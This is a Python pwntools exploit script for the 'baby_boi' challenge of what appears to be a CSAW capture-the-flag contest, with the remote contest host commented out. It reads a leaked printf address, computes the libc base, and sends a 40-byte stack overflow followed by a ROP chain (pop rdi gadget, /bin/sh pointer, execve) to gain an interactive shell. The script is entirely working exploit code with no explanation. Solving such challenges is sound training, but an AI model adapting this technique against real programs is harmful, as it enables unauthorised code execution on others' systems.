from pwn import * 
env = {"LD_PRELOAD":"./libc-2.27.so"}
p = process("./baby_boi",env=env)
#p = remote("pwn.chal.csaw.io",1005)

data = p.recv()
data = data.split("\n")[1]
data = data.split(" ")[3]
printf_libc = int(data,16)
base = printf_libc - 0x0000000000064e80
execve = base + 0x00000000000e4e30
binsh = execve + 0xcf06a
print "base: ",hex(base)
print "execve_libc: ",hex(execve)
print "binsh: ",hex(binsh)
pop_rdi = 0x0000000000400793
paylaod = ""
paylaod += "A"*40
paylaod += p64(0x0000000000400791)
paylaod += p64(pop_rdi)
paylaod += p64(binsh)
paylaod += p64(execve)
p.sendline(paylaod)
p.interactive()
